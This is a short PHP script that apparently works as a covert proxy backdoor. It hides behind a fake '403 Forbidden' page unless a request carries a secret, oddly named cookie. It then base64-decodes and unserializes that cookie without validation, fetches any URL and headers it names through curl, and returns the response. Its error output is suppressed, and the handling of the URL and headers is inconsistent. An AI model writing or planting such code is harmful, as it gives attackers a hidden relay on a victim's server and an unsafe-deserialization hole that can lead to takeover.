<?php
error_reporting(0);

if (!isset($_COOKIE['___EbA_TH5a_r7r']))
deny();
$cookieData=$_COOKIE['___EbA_TH5a_r7r'];

$cookieData=str_replace('#', '+', $cookieData);
$compressed=base64_decode($cookieData);


$data=@unserialize($compressed);

if ($data===false)
    deny();

//$url=$data['url'];
$url=$data;
$headers=$data['headers'];

$result=array(
        'headers'=>array(),
        'content'=>'',
        'result'=>''
);

if (function_exists('curl_init'))
    $result=fetchContentCurl($url, $headers);
else
    die('curl not installed');

$serial=serialize($result);
die($serial);

function deny() {
    header("HTTP/1.0 403 Forbidden");
    $str="<h1>403 Forbidden</h1><!-- token: KcpErEQAWVc1jFt3ZCUQfhBusj0zyU-->";
    die($str);
}

function fetchContentCurl($url, $headers) {
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_TIMEOUT, 25);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $content=@curl_exec($ch);
    
    $result=array();
    
    if ($content===false) {
        $error=curl_error($ch);
        $result['result']='RESULT_ERROR';
        $result['error']=$error;
    }else{
        $result['result']='RESULT_OK';
        list($answerHeaders, $body)=parseAnswer($content);
        $result['headers']=$answerHeaders;
        $result['content']=$body;
    }
    
    curl_close($ch);
    
    return $result;
}

function parseAnswer($content){
    list($headerString, $body)=explode("\r\n\r\n", $content, 2);
    
    $resultHeaders=array();
    
    $headers=explode("\n", $headerString);
    $headers=array_map('trim', $headers);
    $headers=array_diff($headers, array(''));
    
    foreach ($headers as $header){
        if(strpos($header, 'HTTP')===0){
            $resultHeaders['HTTP']=$header;
        }else{
            list($key, $value)=explode(':', $header, 2);
            $resultHeaders[$key]=trim($value);
        }
    }
    
    return array($resultHeaders, $body);
} 